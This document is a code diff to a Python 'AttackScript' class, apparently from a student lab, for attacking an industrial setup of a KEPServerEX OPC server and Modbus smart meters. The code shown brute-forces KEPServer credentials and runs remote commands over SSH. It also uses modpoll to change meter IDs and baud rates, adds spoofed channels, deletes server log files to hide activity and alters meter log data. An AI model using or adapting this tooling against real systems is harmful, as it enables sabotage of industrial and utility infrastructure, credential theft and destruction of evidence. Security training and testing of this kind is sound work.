@@ -114,8 +114,6 @@ class AttackScript:
                 print("Please provide either a password or a private key.")
                 return None
 
-            # Placeholder for other code to run after successful connection
-            print("Connected to the remote server.")
             # Run the command
             ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command(command)
             ssh_output_list = ssh_stdout.readlines()
@@ -364,6 +362,8 @@ class AttackScript:
 
         check_modpoll = self.ssh_run_command(f"{executable_path} {' '.join(parameters)}")
 
+        ##TODO: Add threading for modinterrupt
+
         if "Polling" in check_modpoll:
             print("Modinterrupt is running \nOk.\n")
             parameters = ["-b", baudrate, "-p", "none", "-m", "rtu", "-a", "2", "COM1"]
@@ -513,7 +513,7 @@ class AttackScript:
             print("File have not been encrypted.")
 
     # Run modpoll to change register 40201 to 26
-    def change_meterID(self, revert: bool=False) -> None:
+    def change_meterID(self, revert: bool=True) -> None:
         """
         Run modpoll to change register 40201 (Which handle the meter ID) to 26
         
@@ -578,13 +578,11 @@ class AttackScript:
                 try:
                     server = kepconfig.connection.server(host=self.WINDOWS_SERVER_IP, port=57412, user=username, pw=password)
                     output = server.get_project_properties()
-                    with open(self.COPIED_PATH + "\\KEPServerProperties.txt", "w") as f:
-                        f.write(str(output))
                     print("Success! Username: " + username + ", Password: " + password + "\nOk.\n")
                     success = 1
                     break
                 except Exception as e:
-                    print("Failed.\n")
+                    print(e)
                     continue
 
         if success == 0:
@@ -608,7 +606,7 @@ class AttackScript:
         # Use current_baudrate value to set the new baudrate value in parameters list
         new_baudrate = None
         identifyBR = None
-
+        ##TODO: Add try catch for the if statement
         if current_baudrate == "4800" or revert: # If revert, set new baudrate to 9600
             new_baudrate = "1"
             identifyBR = "9600"
@@ -622,7 +620,7 @@ class AttackScript:
             print("Error: Unknown baudrate", file=sys.stdout)
             return
 
-        print(f"Changed Current BaudRate:{current_baudrate} to {new_baudrate} = {identifyBR}", file=sys.stdout)
+        print(f"Changed Current BaudRate:{current_baudrate} to {identifyBR}", file=sys.stdout)
 
         parameters = ["-b", current_baudrate, "-p", "none", "-m", "rtu", "-a", "25", "-r", "206", "COM1", new_baudrate]
 
@@ -643,7 +641,6 @@ class AttackScript:
         for baudrate in baudrate_list:
             parameters = ["-b", baudrate, "-p", "none", "-m", "rtu", "-a", "25", "-r", "206", "-1", "COM1"]
             baudrate_output = self.ssh_run_command(f"{executable_path} {' '.join(parameters)}")
-            print(baudrate_output)
             print(f"Checking baudrate {baudrate}:")
 
             if "[206]:" in baudrate_output:
@@ -1262,9 +1259,9 @@ class AttackScript:
         server = self.kep_connect()
         print(json.dumps(connectivity.channel.get_all_channels(server), indent=4))
 
-    def kep_get_channel(self):
+    def kep_get_channel(self, channel_name):
         server = self.kep_connect()
-        print(json.dumps(connectivity.channel.get_channel(server, "SmartMeter"), indent=4))
+        print(json.dumps(connectivity.channel.get_channel(server, channel_name), indent=4))
 
     def kep_add_spoofed_channel(self, channel_name):  ### Added to add spoofed channel
         server = self.kep_connect()
@@ -1353,7 +1350,7 @@ class AttackScript:
     def kep_auto_tag_gen(self, channel, device):
         server = self.kep_connect()
         device_info = ".".join([channel, device])
-        print(connectivity.device.auto_tag_gen(server, device_info, job_ttl=8), indent=4)
+        print(connectivity.device.auto_tag_gen(server, device_info, job_ttl=8))
 
     def kep_add_exchange(self, channel, device, ex_type, exchange_name):
         server = self.kep_connect()
@@ -1410,7 +1407,7 @@ class AttackScript:
         server = self.kep_connect()
         print(json.dumps(connectivity.udd.profile.get_all_profiles(server), indent=4))
 
-    def kep_modify_udd_profile(self, profile_name, description):
+    def kep_modify_udd_profile(self, profile_name, new_profile_name, description):
         server = self.kep_connect()
         print(json.dumps(connectivity.udd.profile.modify_profile(server, {"common.ALLTYPES_NAME": profile_name,
                                                                           "common.ALLTYPES_DESCRIPTION": description}),
@@ -1545,7 +1542,7 @@ class AttackScript:
 
                     elif "RUNNING" in command_output:
                         print(f"{service} is running!")
-                        return True
+                        services_state[service_index] = True
                     else:
                         print(f"{service} is still starting up... waiting 1 more second [{counter}]")
                         counter += 1
@@ -1840,13 +1837,13 @@ class AttackScript:
             kep_default_log_folder_path = "C:\\ProgramData\\Kepware\\KEPServerEX\\V6\\"
             for log_file in log_files_to_delete:
                 self.ssh_run_command(f"rmdir /q {kep_default_log_folder_path}{log_file}")
-
+            print("Deleted all log files!")
             # Restart KEPServer after deletion
             self.kep_server_start()
         else:
             print("Unable to delete log files as KEPServer is still running")
 
-    def ChangeDataValueSendBack(self, meter_id: str):
+    def ChangeLogDataValue(self, meter_id: str):
         """
             Change the data value of the latest meter log file, in the specified meter ID's folder
             Example file path of the meter ID is: C:\\Users\\Student\\Documents\\SmartMeterData\\Meter2
